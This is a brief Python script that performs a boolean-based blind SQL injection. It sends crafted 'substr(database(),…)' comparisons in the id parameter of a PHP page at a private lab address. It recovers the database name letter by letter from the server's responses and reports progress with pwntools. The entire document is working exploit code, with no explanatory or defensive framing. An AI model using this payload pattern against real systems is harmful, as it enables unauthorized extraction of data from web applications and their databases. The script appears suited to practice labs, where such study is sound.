#!/usr/bin/python3
from pwn import log
import string, requests

characters = string.ascii_lowercase
bar = log.progress("Database")

value = ""

for position in range(0,20):
    for character in characters:
        request = requests.get(f"http://172.17.0.2/example.php?id=1'and (select substr(database(),{position},1))='{character}'-- -")
        if request.text == "Query was successfully":
            value += character
            bar.status(value)
